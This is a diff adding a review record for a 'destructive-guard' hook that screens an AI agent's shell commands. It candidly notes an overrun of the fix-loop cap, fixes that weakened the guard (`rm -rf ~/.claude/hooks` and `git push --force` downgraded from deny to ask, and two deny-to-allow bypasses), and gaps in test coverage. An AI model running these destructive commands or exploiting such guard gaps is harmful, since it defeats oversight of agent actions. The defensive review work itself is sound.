+    - 4e61e59bf757717b   # loop 3: diff/prose conflict group, site skipped (batch)
+  post_cap_repairs:
+    # DEVIATION FROM PROTOCOL, recorded deliberately.
+    # references/review-phase.md Phase R4 caps auto-fix at 3 loops. After loop 3 the
+    # re-review found that loop 3 itself had introduced two regressions that made the
+    # guard WEAKER than the branch's starting point (ca414bc), both of them
+    # transcript-write deny -> allow bypasses. Shipping a self-inflicted bypass on a
+    # security hook was judged worse than exceeding the loop cap, so the orchestrator
+    # applied exactly these two reviewer-specified minimal repairs directly (no editor
+    # agents, no new review round) and verified them against the base hook.
+    - stable_id: e3cc4d7f18b6e667
+      commit: dd571e8963680ffa41f391d29729ed41b41d2f0f
+    - stable_id: 0b95c49f34f09b75
+      commit: dd571e8963680ffa41f391d29729ed41b41d2f0f
+  verification_after_repairs:
+    suite: "59/59 passed (python3 em-workflow/hooks/tests/run-destructive-guard.py)"
+    differential_sweep: >-
+      43 commands compared between the base hook (ca414bc) and HEAD. 0 unintended
+      weakenings. The only 5 verdict downgrades are exactly the false positives this
+      feature exists to remove (FR1 / FR4 / US1 / US2 / AC-5): reading ~/.claude/hooks
+      and ~/.claude/skills with 2>/dev/null, reading a transcript jsonl, and
+      `cp ~/.claude/settings.json /tmp/backup.json`. Every genuinely destructive command,
+      every transcript write and every self-config write kept its base verdict.
+
+residual_critical_high: 4
+rework_required: false
+notes: >-
+  R4 の 3 ループは正味では大きく前進した（round 1 の 5 件の high を含む多数の実在バイパスを
+  実測で塞いだ）が、ループごとに新しい退行を生む挙動を示した。loop 1 は dynamic-write-target
+  という SPEC 外の規則を追加して `git push --force origin $BRANCH` の deny を ask に降格させ、
+  loop 2 はそれを直しつつ SELF_CONFIG 変更で `rm -rf ~/.claude/hooks` を deny→ask にし、
+  loop 3 は融合トークン分割と install 分岐で 2 件の deny→allow を作った。後者 2 件のみ
+  cap 後に修復済み（上記）。根本原因は 1 つで、`destructive-guard-cases.json` が
+  auto-fix の対象外（review-editor は単一ファイル限定）のため、新設された判定経路が
+  1 件もテストで固定されていないこと（stable_id da8c7f575c6fe8a8）。
+  59/59 green は新経路を一度も踏んでいない green である。
+  次の作業者への推奨順序: (1) da8c7f575c6fe8a8 のケース追加を先に行う、
+  (2) spec 系 4 件（bb74a3458679e1b4 / bafd6e8260de4337 / 7f7144aea35f534f /
+  02d9c33015f12347）で SPEC を直すかスコープを縮小するかを決める、
+  (3) 残りの security / architecture 残件に着手する。
